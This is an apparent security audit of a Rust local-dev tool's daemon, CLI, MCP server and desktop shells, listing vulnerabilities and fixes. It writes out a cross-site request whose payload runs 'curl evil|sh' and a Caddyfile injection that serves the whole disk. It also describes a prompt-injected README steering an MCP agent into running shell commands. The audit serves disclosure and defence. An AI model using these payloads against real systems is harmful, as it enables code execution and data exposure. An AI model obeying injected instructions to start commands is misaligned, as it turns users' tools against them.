# BOZKURT CODE — Rust audit (crates + Tauri shells)

- **Scope:** `crates/bz-core`, `crates/bz-net`, `crates/bz-daemon` (bozkurtd), `crates/bz-cli` (bz), `crates/bz-mcp` (bozkurt-mcp), `apps/desktop/src-tauri`, `apps/mobile/src-tauri`.
- **Baseline:** `main` @ `397f5cd`. The audit only reads the code. No crate or app source was changed. This file is the only thing this audit adds to the repo.
- **Contract checked against:** `docs/ARCHITECTURE.md`, `docs/API.md` (including the "v1 additions"), `docs/CLI.md`, `docs/MCP.md`, `packages/ui/src/api/types.ts`, and the earlier e2e run (`work/e2e/TRANSCRIPT.md`).
- **Host:** Linux aarch64, rustc/cargo 1.99.0. Every build used `CARGO_BUILD_JOBS=1`, `CARGO_PROFILE_DEV_DEBUG=0` and `CARGO_TARGET_DIR=work/target-audit`.

Priorities:
- **P0** blocks a release: a compile failure, or a remotely or cross-site exploitable hole.
- **P1** must be fixed for 1.0: a real bug, a security hardening gap, or a broken platform path.
- **P2** is a nice-to-have, cleanup, or defence in depth.

Each finding gives the file:line, why it matters, and the proposed fix. IDs are stable so the fixer can reference them in commits.

---

## 0. Summary

| Priority | Count |
|---|---|
| P0 | 3 |
| P1 | 23 |
| P2 | 27 |

**Top 10 (fix in this order):**
1. **P0-1**: The local API (127.0.0.1:7878) has no authentication. It does not check the Host header, the Origin header or the Content-Type. Any web page the user visits can therefore create an `app` site with an arbitrary `command` and start it, which is code execution. It can also read the live event and log stream over WebSocket. **Verified live** (see §3).
2. **P0-2**: Caddyfile injection. Patching the `framework` field (or `root`, or an env value with a newline) can inject arbitrary Caddy directives. Caddy also listens on every interface, so an injected `file_server` exposes the disk to the LAN.
3. **P0-3**: The desktop Tauri crate (`apps/desktop/src-tauri`) result on Linux is in §1.3. It also cannot be built from a clean clone without the sidecar binary and `dist/` being present.
4. **P1-1**: PHP downloads on macOS and Linux (static-php.dev) have **no integrity check**. This breaks the "every download is verified" rule in ARCHITECTURE. The proposed solution is in §4.
5. **P1-2**: Remote pairing can be brute-forced. The rate limit is per IP only, with no global cap. The listener is plaintext HTTP on `0.0.0.0` and the bearer token travels in the clear.
6. **P1-5 / P1-6 / P1-7**: Process supervision:
   - A race in `start` can orphan processes.
   - Invalid UTF-8 in a child's output stops the reader, so the child eventually blocks on a full pipe.
   - Children survive a daemon crash.
7. **P1-10**: Windows `.cmd` shims break arguments. `call` doubles `^`, so `composer require foo/bar:^1.0` is broken, and delayed expansion eats `!`.
8. **P1-13**: The Windows PHP pool is a single `php-cgi.exe`. All PHP requests are serialized, and a page that calls itself deadlocks.
9. **P1-16**: App sites (Vite) return 403 `Blocked request. This host is not allowed` behind Caddy. Vite may also bind only `::1` while Caddy proxies to `127.0.0.1`.
10. **P1-18**: The MCP tools `sites_create`, `sites_update` and `sites_start` run arbitrary shell commands with no `confirm` preview. A prompt injection becomes code execution.

---

## 1. Cross-platform compile checks

| Target | Command | Result |
|---|---|---|
| `aarch64-unknown-linux-gnu` (host) | previous runs (`49f67bf`, `397f5cd`): build, clippy `-D warnings`, tests | green (per commit messages and the e2e transcript) |
| `x86_64-pc-windows-gnu` | `cargo check --target x86_64-pc-windows-gnu --all-targets` (default members), with `CC=x86_64-w64-mingw32-gcc` from apt `gcc-mingw-w64-x86-64` | **0 errors, 0 warnings** (15m09s). All `cfg(windows)` code in bz-core, bz-net, bz-daemon, bz-cli and bz-mcp type-checks, tests included. |
| `x86_64-apple-darwin` | `cargo check --target x86_64-apple-darwin --all-targets` (default members) | **0 errors, 0 warnings** (5m13s; the C build scripts were stubbed, see §1.2). All `cfg(target_os="macos")` and `cfg(unix)` code type-checks, tests included. |
| `apps/desktop/src-tauri` (Linux host) | `cargo check -p bozkurt-desktop` after `apt install libwebkit2gtk-4.1-dev libgtk-3-dev librsvg2-dev libayatana-appindicator3-dev` | *in progress when this revision was committed; see the follow-up commit* |

### 1.1 Windows notes
- The C dependencies (`ring`, `lzma-sys` via `xz2 static`) cross-compile cleanly with mingw-w64. CI needs either the MSVC toolchain on a Windows runner, or mingw installed for `-gnu`.
- A clean `cargo check` does not prove the Windows **runtime** behaviour. §5 lists the Windows logic bugs that compile fine but misbehave: P1-9 to P1-15.

### 1.2 macOS notes
- There is no macOS SDK or osxcross in the sandbox. To type-check, the C build scripts (`ring`, `lzma-sys`) were satisfied with an audit-only stub compiler (`work/fakecc/cc`). The stub answers cc-rs' `-E` family probe with host gcc and emits empty objects. `cargo check` never links C code, so the **Rust** type-check is complete.
- The stub does not prove the C code builds for Apple. CI on `macos-14` and `macos-13` runners must still do a real build.
- One thing found while setting the stub up: when cc-rs cannot detect the compiler family, it falls back to MSVC-style flags (`-Fo`, `/Gy`). A broken `CC_x86_64_apple_darwin` therefore shows up as "object not found" from `ar`, not as a compiler error. This is worth a line in CONTRIBUTING for anyone cross-checking.

### 1.3 Desktop / mobile Tauri crates
Pending (the check was still compiling the tauri/webkit2gtk tree at `CARGO_BUILD_JOBS=1`).

---

## 2. P0: release blockers

### P0-1: Local API is open to any web page and any local user (CSRF, DNS rebinding, cross-site WebSocket)
**Where:**
- `crates/bz-daemon/src/api.rs:41-58`: `Body<T>` parses any body as JSON whatever the `Content-Type`.
- `api.rs:134-142`: no auth layer on `Scope::Local`.
- `api.rs:146-163`: CORS only.
- `api.rs:781-786`: `/events` upgrades without an Origin check.
- `server.rs:99`: binds 127.0.0.1 without any Host check.

**Why:**
- CORS only stops the *response* from being read. A cross-site `fetch(…, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body:'{"path":"/tmp","kind":"app","command":"curl evil|sh"}'})` is a "simple request": it gets no preflight and still runs.
- With `POST /sites` followed by `POST /sites/{id}/start`, any website the developer visits gets **code execution as the user**.
- DNS rebinding (`evil.com` → 127.0.0.1) also gives full read access, because the Host header is not validated.
- The WebSocket `/events` accepts any Origin, so a page can read all `log` events: app output, SQL errors, paths.
- On multi-user machines every local user can drive the daemon of every other user.

**Verified live** against a running daemon (another agent's instance on :17878):
```
POST /api/v1/detect  Content-Type: text/plain  Origin: https://evil.example  Host: rebind.evil.example
→ HTTP/1.1 200 OK {"path":"/tmp","framework":"static",...}
GET /api/v1/events (Upgrade: websocket, Origin: https://evil.example)
→ HTTP/1.1 101 Switching Protocols
```

**Fix (all four):**
1. **Host allowlist** middleware on the local listener: accept only `127.0.0.1:<port>`, `localhost:<port>` and `[::1]:<port>`. Anything else gets 421 or 403. This kills DNS rebinding.
2. **Origin check:**
   - If an `Origin` header is present, it must be in `CORS_ORIGINS`. Otherwise return 403. This applies to every method, **including the WebSocket upgrade**.
   - Requests with no Origin (CLI, MCP, curl) pass.
3. **Content-Type:** in `Body<T>`, require `application/json` when the body is non-empty, so a browser has to send a preflight.
4. **Local token** (defence against other local users and against malware-free browser tricks):
   - At startup, generate `$BOZKURT_HOME/api-token` (32 random bytes, hex, file mode 0600, `%LOCALAPPDATA%` ACL on Windows).
   - Require `Authorization: Bearer` or `X-Bozkurt-Token` on the local listener too.
   - bz and bozkurt-mcp read the file.
   - The desktop gets the token through a Tauri command, not through JS fetch of the file.
   - Use the same constant-time compare as `remote.rs:117`.

Add integration tests in `crates/bz-daemon/tests/api.rs` for each rejection.

### P0-2: Caddyfile directive injection, plus every site exposed on the LAN
**Where:**
- `crates/bz-core/src/caddyfile.rs:146-155` interpolates `s.framework` into a `# site …` comment line without escaping.
- `crates/bz-core/src/sites.rs:168` (`set!(… framework)`) accepts any string from `PATCH /sites/{id}`, MCP `sites_update` and the remote listener.
- `caddyfile.rs:89-92` `q()` escapes `"` but not newlines. It also rewrites **every** `\` to `/`, which silently corrupts env values (regexes, Windows paths in `.env`-style values) passed through `php_fastcgi { env … }` at `caddyfile.rs:203`.

**Why:**
- A newline in `framework` closes the comment, and whatever follows becomes Caddyfile, for example:
  ```
  :18080 {
      root * /
      file_server browse
  }
  ```
- The generated config has no `default_bind`, so Caddy listens on **all interfaces**. An injected block, and in fact every dev site, is reachable from the LAN or café Wi-Fi.
- This chains with P0-1: one cross-site request exposes the user's whole disk to the network.

**Fix:**
- Validate `framework` against the known detector ids (`^[a-z0-9-]{1,32}$`) in `sites::validate`. Also never put free text in comments: strip `\r\n` in `generate`.
- Make `q()` reject or escape control characters (`\n`, `\r`, `\t`, NUL). Escape `\` as `\\` instead of converting it.
- Validate env keys against `^[A-Za-z_][A-Za-z0-9_]*$`.
- Add `default_bind 127.0.0.1 [::1]` to the global options block (`caddyfile.rs:113-120`). Make LAN exposure an explicit per-site or config opt-in, used only by "share" or remote mode.
- Golden test: a site whose `framework`, `root`, `env` and `php` fields contain `\n}\n:1 {\n` produces exactly one site block.

### P0-3: Desktop crate build blockers
Pending the desktop `cargo check` (§1.3).

---

## 3. Evidence for P0-1
The P0-1 requests were run with `curl --noproxy '*'` against the daemon at `127.0.0.1:17878` (`work/ui-audit/home`). Only `POST /detect` (read-only) and a WebSocket handshake were sent. Nothing was mutated.

---

## 4. Download verification: static-php.dev has no checksums (P1-1)

**Where:**
- `crates/bz-core/src/catalogs.rs:202-210`: `checksum: Checksum::None` for the `cli` and `fpm` tarballs.
- `crates/bz-core/src/download.rs:169-171`: a `None` checksum only logs.
- Other silent fallbacks to `None`:
  - `catalogs.rs:253` (Windows PHP when `sha256` is missing in releases.json)
  - `catalogs.rs:532` (Go)
  - `services.rs:319`
  - `crates/bz-daemon/src/share.rs:95` (cloudflared when the GitHub `digest` is missing)

**Research (2026-10-09):**
- `https://dl.static-php.dev/static-php-cli/bulk/?format=json` is a plain directory listing. Its 925 entries carry only `name`, `size`, `last_modified` and `download_count`. No `.sha256`, `SHA256SUMS`, `.asc` or `.sig` files exist. The only non-archive file is `README.txt`, which lists the build command (`spc build … --with-upx-pack`) and no hashes.
- The GitHub releases of `crazywhalecc/static-php-cli` (2.8.3–2.8.5) contain only the **`spc` builder** binaries (`spc-linux-x86_64.tar.gz`, …). Each has a GitHub `digest: sha256:…`. No PHP binaries are published there, so the digests cannot cover the bulk downloads.
- The official php.net source tarball sha256s **do not apply**. They hash `php-X.Y.Z.tar.xz` source, not the UPX-packed static binaries.

**Proposed solution (in order of preference):**
1. **Build and publish our own PHP static bundles** with `spc` in GitHub Actions:
   - Matrix: `{8.1..8.5} × {linux-x86_64, linux-aarch64, macos-x86_64, macos-aarch64}`.
   - Use the same extension list as the README, so users see no behaviour change.
   - Pin the `spc` version and verify its own GitHub `digest`.
   - Upload as release assets of `bozkurt-code/php-builds`. GitHub then provides `digest: sha256:` per asset, which `Checksum::from_github_digest` already consumes (`catalogs.rs:371`).
   - Also publish `SHA256SUMS` plus a minisign/ed25519 signature. Embed the public key in bz-core and verify the signature before trusting the sums file.
   - This also gives reproducibility and control over the extension set and UPX. UPX-packed binaries trip some antivirus engines and macOS notarization tooling.
2. **Interim pinned manifest:**
   - A CI job downloads each new static-php.dev artefact once, records its sha256 in `catalogs/php-static.json`, and signs it.
   - Commit that file to the repo and serve it from GitHub Pages or a release.
   - bz-core fetches the manifest and verifies the signature with the embedded key. A file not in the manifest is refused unless `--allow-unverified`.
3. **Minimum (if nothing else ships for 1.0):** trust on first use.
   - Store the sha256 of the first successful download in `state.json` and refuse a later re-download that differs.
   - Show "unverified download" in the job message and in `bz doctor`, and require `--allow-unverified` from the CLI or MCP.
   - Change `download()` to **fail closed** on `Checksum::None` unless the caller passes `AllowUnverified::Yes`. Today, a Go, Windows PHP or cloudflared index that drops its hash silently downgrades to "no verification".

---

## 5. P1: must fix for 1.0

### Security

**P1-2: Remote pairing can be brute-forced; transport is cleartext**
- **Where:** `crates/bz-daemon/src/remote.rs:17,193-224` (per-IP `MAX_ATTEMPTS_PER_MIN = 5`) and `server.rs:207` (`0.0.0.0`, plain HTTP).
- **Why:**
  - A 6-digit code is valid for 5 min. With a per-IP limit only, an attacker with many source addresses (several LAN hosts or containers, or quickly rotating DHCP/alias IPv4 addresses on a hostile Wi-Fi) can try about 10⁶ codes.
  - The `attempts` map is never pruned, so it grows without limit.
  - The bearer token, and `?token=` on `/events`, travel in cleartext on shared Wi-Fi. A passive sniffer gets a token with full API rights (P2-22).
- **Fix:**
  - Add a **global** failure budget: invalidate the active code after 10 failed attempts in total, and cap `attempts` at 1024 entries with LRU eviction.
  - Serve the remote listener over **TLS** with a leaf from the local CA for the LAN IPs. Put the CA fingerprint in the QR (`bozkurt://pair?host=…&code=…&fp=sha256:…`) and pin it in the mobile app.
  - Bind to the chosen LAN interface rather than `0.0.0.0`.
  - Keep `?token=` but strip it from any future request logging.

**P1-3: Caddy admin API is fixed at `127.0.0.1:2019`**
- **Where:**
  - `caddyfile.rs:22`
  - `engine.rs:675`: `wait_listening(2019)` only proves *something* is listening.
  - `caddyfile.rs:293-315`: `POST /load`.
- **Why:**
  - If the user already runs their own Caddy, which is the default on 2019, our `apply_caddy` **replaces the user's Caddy config** through `/load`, and our own Caddy fails to start.
  - Any local process can also reconfigure our proxy.
- **Fix:**
  - Unix: `admin unix//$BOZKURT_HOME/caddy/admin.sock` (mode 0600). The reqwest client then talks over a Unix socket; hyper-util with a `UnixConnector`, or fall back to `caddy reload --address unix//…`.
  - Windows: a free port chosen at start and stored in state.
  - Either way, verify that the port owner pid is our supervised caddy before calling `/load`.

**P1-4: The local CA has no name constraints and is trusted system-wide**
- **Where:** `crates/bz-net/src/tls.rs:338-365` (`IsCa::Ca(Constrained(0))`, no `name_constraints`).
- **Why:**
  - Trust is installed in the login keychain, CurrentUser\Root or NSS, and optionally in the system stores.
  - Any process that reads `ca/rootCA-key.pem` (readable by the user) can mint certificates for `google.com` that the user's browsers trust.
- **Fix:**
  - Set `params.name_constraints = Some(NameConstraints { permitted_subtrees: [DnsName(tld), DnsName("localhost")], excluded_subtrees: [] })`. Add IP ranges if LAN TLS (P1-2) needs them.
  - Regenerate and re-trust when `tld` changes. Show the constraint in `bz trust status`.
  - All modern browsers honour DNS name constraints on roots.

**P1-17: CORS includes dev-server origins in release builds**
- **Where:** `api.rs:29-35`.
- **Why:** Any unrelated local dev server on :1420 or :1430 (a common Tauri/Vite port) can read the whole API. Once P0-1's Origin check exists, this becomes the main remaining hole.
- **Fix:** Allow `http://localhost:1420|1430` only under `cfg(debug_assertions)` or `BOZKURT_DEV=1`.

**P1-18: MCP lets an agent run arbitrary shell commands without confirmation**
- **Where:** `crates/bz-mcp/src/handlers.rs:193-208` (`sites_create`), `:210-220` (`sites_update`), `:221-235` (`sites_start`, `sites_restart`).
- **Why:**
  - `command` is free shell text, and `ProcessSpec::shell` runs it with `sh -c` / `cmd /C`.
  - A prompt-injected README can make the agent create or patch an app site and start it. No `confirm` preview stands in the way.
  - MCP.md classifies these tools as "change", not "system".
- **Fix:**
  - Treat any create or update that sets or changes `command`, and any `sites_start`/`sites_restart` of an app site whose command has not been confirmed since its last change, as **system** tools that require `confirm: true`.
  - Show the exact command in the preview.

### Process supervision

**P1-5: Race in `Supervisor::start` orphans processes**
- **Where:** `crates/bz-core/src/supervisor.rs:201-236`.
- **Why:**
  - The "already running?" check (`get` + `done_rx`) and the `insert` are separate lock scopes, with `spawn_child` in between.
  - Two concurrent starts of the same name both spawn. The second `insert` replaces the first `Managed`.
  - The first child keeps running, untracked and unstoppable, and holds its port.
  - This is reachable with a double-click in the UI, the CLI and UI at once, or the autostart task racing `POST /services/x/start`.
- **Fix:** Keep the `procs` lock across check-and-reserve. Insert a placeholder or "Starting" `Managed` before `spawn_child`, and roll it back on spawn error. Alternatively use a per-name `tokio::sync::Mutex`.

**P1-6: The output reader stops on invalid UTF-8 and the child hangs**
- **Where:** `supervisor.rs:335` and `:344` (`while let Ok(Some(l)) = lines.next_line().await`).
- **Why:**
  - `next_line` returns `Err(InvalidData)` on a non-UTF-8 line, for example Latin-1 from MariaDB on Windows, binary output, or a Turkish ANSI codepage.
  - The loop ends and nobody drains the pipe. Once the OS pipe buffer (64 KiB) fills, the child **blocks on write forever**: the service is "running" but dead.
  - Very long lines also grow without limit.
- **Fix:** Use `read_until(b'\n', &mut Vec)` with a cap (for example 64 KiB, truncating), then `String::from_utf8_lossy`. Never stop draining until EOF.

**P1-7: Children survive a daemon crash or kill; no reaping at startup**
- **Where:**
  - `supervisor.rs:495`: `process_group(0)` detaches the children from the daemon's group.
  - Windows `:497-501`: `CREATE_NEW_PROCESS_GROUP` with no Job Object.
  - `bz-cli/src/daemon.rs:206-216`: `taskkill /F`.
  - The desktop kills its sidecar.
- **Why:**
  - After `kill -9`, an OOM kill, a panic abort or `taskkill /F`, Caddy, php-fpm, MariaDB and the app dev servers keep running and hold 80/443/3306.
  - The next daemon then reports them as `external` (`engine.rs:692-696`) and never manages them again.
- **Fix:**
  - **Windows:** create a Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` at daemon start and assign every child to it. This is reliable even on a crash.
  - **Linux:** `prctl(PR_SET_PDEATHSIG, SIGTERM)` in `pre_exec`.
  - **All OSes:** record `{name, pid, start_time}` in `$HOME/run/children.json`. At startup, kill leftovers whose pid and start time still match.

**P1-8: Windows graceful stop always waits the full timeout**
- **Where:** `supervisor.rs:526-547`.
- **Why:**
  - `taskkill /T /PID` without `/F` asks the process to close its windows. Children run with `CREATE_NO_WINDOW` and have no window, so taskkill answers "can only be terminated forcefully".
  - Every stop therefore waits `stop_timeout` (10 s) before `/F`. Restarting Caddy, PHP or MariaDB takes at least 10 s each.
  - The blocking `std::process::Command::status()` also runs on a tokio worker thread.
- **Fix:**
  - Use service-native graceful stops:
    - Caddy: `POST /stop` on the admin endpoint.
    - MariaDB: `mariadb-admin shutdown`.
    - Postgres: `pg_ctl stop -m fast`.
    - Redis: `SHUTDOWN` via redis-cli.
    - php-cgi: kill.
  - Otherwise `GenerateConsoleCtrlEvent(CTRL_BREAK_EVENT)` for console children, giving them a hidden console instead of `CREATE_NO_WINDOW`.
  - Then `TerminateJobObject`. Run any external command through `tokio::process`.

**P1-15: No graceful daemon shutdown endpoint; Windows always hard-kills**
- **Where:** `crates/bz-cli/src/daemon.rs:160-216` (SIGTERM on Unix, `taskkill /PID /T /F` on Windows) and `apps/desktop/src-tauri/src/lib.rs:476-480`.
- **Why:**
  - On Windows the daemon never runs `Daemon::shutdown`: no orderly service stop, no DNS responder stop, and the pid file is left behind.
  - A detached daemon on Windows has no console, so `ctrl_c()` never fires (`main.rs:102-105`).
- **Fix:** Add `POST /api/v1/daemon/shutdown`, local scope only and token-protected per P0-1. It triggers the same path as SIGTERM. Use it from bz, the desktop app and the tray. Keep taskkill only as a fallback.

### Windows-specific

**P1-9: Junction creation goes through `cmd /C mklink /J` with unquoted paths**
- **Where:** `crates/bz-core/src/fsutil.rs:95-116`.
- **Why:**
  - Rust quotes arguments only when they contain spaces or tabs. A home such as `C:\Users\Ali&Veli\AppData\Local\Bozkurt` or a path containing `%`, `^`, `(` or `)` is parsed by cmd.exe as command separators or expansions. `runtime use` breaks, and arbitrary commands can run.
  - It is also not atomic: the old junction is removed first, so a failure leaves no `current/`.
- **Fix:**
  - Create the junction natively, using the `junction` crate (DeviceIoControl `FSCTL_SET_REPARSE_POINT`).
  - Swap atomically: create `current\.php.tmp-<uuid>`, then `MoveFileExW(MOVEFILE_REPLACE_EXISTING)` on the junction, with a remove-then-rename fallback.

**P1-10: The `.cmd` shim mangles arguments**
- **Where:** `crates/bz-core/src/runtimes.rs:692` (`EnableDelayedExpansion`) and `:721` (`call "!DIR!\…" %*`).
- **Why:**
  - `call` doubles carets in quoted arguments. `composer require "laravel/framework:^11.0"` reaches composer as `^^11.0`.
  - With delayed expansion on, every `!` in an argument is eaten, for example `php -r "echo 'hi!';"`, or git and npm arguments.
  - `%CD%` or `BOZKURT_HOME` containing `!` or `%` also break (`:693`, `:698`).
- **Fix (preferred):** Ship a tiny native shim (`bz-shim.exe`, about 200 KB of Rust):
  - It reads its own file name, resolves the version with the same logic as `project_version`, and `CreateProcessW`s the target with the original command line untouched.
  - It handles Ctrl-C properly. Scoop, Volta and proto all do this.
- **Fix (minimal):**
  - For `.exe` targets, invoke directly without `call`.
  - Do `endlocal & set "DIR=%DIR%"` before launching, so delayed expansion is off when `%*` expands.
  - Keep `call` only for `.cmd` targets (npm, npx, corepack) and document the caret limitation there.

**P1-11: `cmd /C` quoting for app commands**
- **Where:** `crates/bz-core/src/supervisor.rs:129-135`.
- **Why:** Rust's MSVCRT-style quoting escapes inner `"` as `\"`, which cmd.exe does not understand. An app command such as `node "my server.js" --port %PORT%` breaks.
- **Fix:** `cmd.raw_arg(format!("/d /s /c \"{command}\""))` via `std::os::windows::process::CommandExt::raw_arg`. Do not pass the command as a normal arg.

**P1-12: Port-owner detection depends on English `netstat` output**
- **Where:** `crates/bz-net/src/ports.rs:228-253` (`f[3] == "LISTENING"`).
- **Why:** netstat state names are localized ("ABHÖREN", "À L'ÉCOUTE", and so on). On a non-English Windows, which includes the maintainer's Turkish locale, `port_owner` never finds the pid. "Who holds port 80" and the "ours" flag in doctor are wrong.
- **Fix:**
  - Use `GetExtendedTcpTable` / `GetExtendedUdpTable` (windows-sys `Win32::NetworkManagement::IpHelper`), which needs no parsing.
  - Or use `Get-NetTCPConnection -State Listen -LocalPort N | Select OwningProcess`, whose state is an enum, not localized.
  - Interim: treat a TCP row with foreign address `0.0.0.0:0` / `[::]:0` as listening.

**P1-13: The Windows PHP pool is one `php-cgi.exe`**
- **Where:** `crates/bz-core/src/services.rs:751-757`.
- **Why:**
  - php-cgi on Windows handles one request at a time; `PHP_FCGI_CHILDREN` is not supported on Windows.
  - Parallel asset or AJAX requests are serialized, and a PHP page that calls its own site (WordPress loopback/cron, Laravel HTTP client to self) **deadlocks** until timeout.
- **Fix:**
  - Spawn N (4–8) `php-cgi -b 127.0.0.1:<port_i>` processes under names like `php-fpm-8.3#i`.
  - Emit `php_fastcgi 127.0.0.1:p1 127.0.0.1:p2 … { lb_policy least_conn }`.
  - Set `PHP_FCGI_MAX_REQUESTS=500` and rely on the supervisor restart.
  - Also check `php_cgi_port` (`services.rs:137`) for collisions between minors 8.x and 9.x.

**P1-14: Windows NRPT needs the responder on :53, but there is no conflict handling**
- **Where:** `crates/bz-net/src/resolver.rs:293-305` and `crates/bz-daemon/src/netprovider.rs:176-191`.
- **Why:**
  - On Windows the DNS responder is restarted on `127.0.0.1:53`. Internet Connection Sharing (SharedAccess), Hyper-V/WSL (`hns`) and Docker Desktop commonly hold 53.
  - `start_dns` then fails and `configure_dns` aborts **after** the user approved elevation, or the NRPT rule ends up pointing at nothing.
  - NRPT also only covers the Windows DNS Client: WSL2 and some VPN clients bypass it.
- **Fix:**
  - Probe UDP and TCP 127.0.0.1:53 before showing the elevation prompt, and name the owning process using P1-12.
  - Offer the hosts-file fallback automatically.
  - Try a dedicated loopback such as `127.53.0.1:53` (Windows usually allows a specific-address bind next to another process's wildcard bind unless that process used `SO_EXCLUSIVEADDRUSE`; verify on a Windows host) and point NRPT `-NameServers 127.53.0.1` at it.

### Correctness

**P1-16: App sites behind Caddy fail with Vite and some Node servers**
- **Where:**
  - `crates/bz-core/src/caddyfile.rs:238-241`: `reverse_proxy 127.0.0.1:{p}`, passing the original Host.
  - `crates/bz-core/src/detection.rs:175`: `--port $PORT --strictPort` with no `--host`.
  - `engine.rs:1117`: `HOST=127.0.0.1`, which Vite ignores.
- **Why:**
  1. Since Vite 6.0.9 / 5.4.12 / 4.5.6, `server.allowedHosts` rejects any Host other than localhost, `*.localhost` or IPs, with a **403 "Blocked request. This host ("shop.test") is not allowed"**. Source: https://vite.dev/config/server-options, `server.allowedHosts`.
  2. Vite's default `host: 'localhost'` binds `::1` only on many macOS and Node ≥17 setups, so Caddy's `127.0.0.1:{p}` gets connection refused (502).
- **Fix:**
  - In `app_env`, set `__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=<domain>,.<domain>` plus the aliases. This variable is documented by Vite for exactly this purpose.
  - Add `--host 127.0.0.1` to the Vite, Astro and SvelteKit commands in detection.
  - Proxy to `localhost:{p}` (Caddy tries every resolved address), or detect the bound address from the port owner.

**P1-19: The desktop sidecar detaches, so the tracking and kill-on-exit are wrong; the API port is hard-coded**
- **Where:** `apps/desktop/src-tauri/src/lib.rs:102-106` (`sidecar("bozkurtd")` with no args), `:476-480`, and `:21` (`const API = 127.0.0.1:7878`).
- **Why:**
  - Without `--foreground`, bozkurtd re-execs itself detached (`bz-daemon/src/main.rs:121-132`) and the sidecar process exits immediately.
  - `DaemonState.child` therefore holds a dead process. The "only stop a daemon we started" logic is a no-op, and `ensure_daemon` reports spawn success even when the detached child failed.
  - A user `api_port` in `config.toml` is ignored by the desktop shell. The CLI honours it.
- **Fix:**
  - Decide on one model. The recommendation is that the daemon outlives the GUI: spawn with `--foreground` only from `bz daemon run`, keep the detach for the GUI, drop `child`, and stop through the new shutdown endpoint (P1-15) only when the user picks "Quit and stop services".
  - Read `api_port` from `$BOZKURT_HOME/config.toml`, sharing the CLI's `daemon.rs` resolver, and get the token per P0-1.

**P1-20: API contract drift (types.ts vs Rust vs API.md)**
- `PortOwner.in_use` is required by the "v1 additions" and returned by `api.rs:498-512`, but it is **missing** in `packages/ui/src/api/types.ts` (`interface PortOwner`).
- `GET /remote` returns `running` (`api.rs:669-675`). It is absent from `RemoteInfo` in types.ts and from API.md.
- `TlsInfo.ca_expires` is `string` (required) in types.ts, but `Option<String>` with `skip_serializing_if` in Rust (`models.rs:307-308`). The UI must handle it being absent.
- `POST /remote/pair` returns `{token, device_id}`; API.md says `{token}`.
- `POST /sites` and `POST /services/{e}/databases` return **201**. API.md does not specify the status; CLI and UI accept any 2xx, but document it.
- The undocumented routes `GET /services/{name}` and `GET /share/{site_id}` must go into API.md.
- `POST /import` documents `{vhosts, dns}`, but `crates/bz-daemon/src/import.rs:325-348` ignores `dns` silently. Either implement DNS import (backups + elevation plan) or return 400 / document it as a no-op.
- **Note:** while this audit ran, *uncommitted* working-tree edits by another agent to `packages/ui/src/api/{types,client,mock}.ts` added `PortOwner.in_use`, `RemoteInfo.running`, `ShareState` and `PairResponse`. Re-check these bullets once that change lands; `ca_expires` optionality and the `import` `dns` no-op were not touched.
- **Fix:** Regenerate types.ts from the Rust models (`ts-rs` or `schemars` → `json-schema-to-typescript`) in CI, so this cannot drift again.

**P1-21: CLI.md and MCP.md describe endpoints that no longer exist**
- `docs/CLI.md:142-144` and `:215-223` ("Gaps against API.md v1") and `docs/MCP.md:130-132` still say `bz db …` and `db_*` call the **proposed** `GET /db`, `POST /db`, `DELETE /db/{engine}/{name}`.
- The code calls `GET/POST /services/{engine}/databases` and `DELETE /services/{engine}/databases/{name}` (`bz-cli/src/commands.rs:1079-1115`, `bz-mcp/src/handlers.rs:345`).
- CLI.md `:132` and `:135` still say `dns setup --undo` and `trust --undo` need endpoints "not yet in API.md". Both are implemented (`/dns/unconfigure`, `/tls/untrust`).
- The hidden `bz tls trust|untrust|status` and `bz service …` aliases are not documented.
- **Fix:** Update both docs and delete the "Gaps" section.

**P1-22: Concurrent install of the same runtime version races**
- **Where:** `crates/bz-core/src/runtimes.rs:309-357` (`if dest.exists()` check, then download and `install_tree`).
- **Why:** Two install jobs (UI double-click, or UI and CLI) download twice. The second `install_tree` fails with `Conflict` or `rename` ENOTEMPTY after a long download, and both jobs report confusing errors.
- **Fix:** Add a per-`(kind, version)` async mutex, or make the job manager dedupe running jobs with the same title or key and return the existing `job_id`.

### Release metadata

**P1-23: Placeholder repository URL**
- **Where:** `Cargo.toml` `[workspace.package] repository = "https://github.com/OWNER/bozkurt-code"`.
- **Why:** It ends up in crate metadata, `--version` output and bundle metadata.
- **Fix:** Set the real URL before tagging 1.0.

---

## 6. P2: nice to have

| ID | Where | Why | Fix |
|---|---|---|---|
| P2-1 | `engine.rs` (≈20× `.lock().expect("…")`), `state.rs:115-126`, `supervisor.rs`, `remote.rs`, `jobs.rs` | A single panic while a std `Mutex` is held poisons it. After that, every request panics and the daemon is permanently broken. | Use `parking_lot::Mutex` (no poisoning) or `.lock().unwrap_or_else(PoisonError::into_inner)`. |
| P2-2 | `crates/bz-daemon/src/remote.rs:140-160` | `remote.json` is written through `atomic_write` (default umask, typically 0644) and only then chmod-ed to 0600. There is a short window where the token hashes are world-readable. | Create the temp file with mode 0600 (`OpenOptionsExt::mode`), as `bz-net/src/tls.rs:247-275` does. Give `fsutil::atomic_write` a `mode` parameter. |
| P2-3 | `remote.rs:69,201` | The `attempts: HashMap<IpAddr, …>` map is never pruned. | Prune empty queues, cap the size (see P1-2). |
| P2-4 | `crates/bz-core/src/download.rs:261-264` | Zip extraction keeps the setuid/setgid/sticky bits (`mode & 0o7777`). | Mask with `0o777`. Tar keeps the permissions via `set_preserve_permissions(true)`; also clear the setuid bits there (`Archive::set_mask(0o7000)`). |
| P2-5 | `crates/bz-core/src/sites.rs:159-164` | `apply_patch` accepts a **relative** `path` (`build_site` requires an absolute one, `:80`). Detection, shims and Caddy roots then resolve against the daemon's cwd. | Require `is_absolute()` in the patch too. Reject `root` that escapes `path` (`..`) unless it is absolute and explicitly allowed. |
| P2-6 | `crates/bz-core/src/caddyfile.rs:166-174` | A missing cert falls back to `tls internal`, so Caddy silently creates a **second, untrusted CA** under `caddy/data/caddy/pki` (seen in `work/ui-audit/home`). The browser shows an untrusted cert with no hint why. | Serve an HTTP 502 page or log an explicit error. Do not mint a Caddy CA, or set `local_certs` with our own CA as `pki` root. |
| P2-7 | `engine.rs:706-748` | `init_service` treats any non-empty data dir as initialised. A failed half-initialised MariaDB or Postgres data dir is trusted forever. | Write a marker file (`.bozkurt-initialized`) after a successful init. If the marker is missing and the dir is non-empty, move the dir to `backups/` and re-init, after asking. |
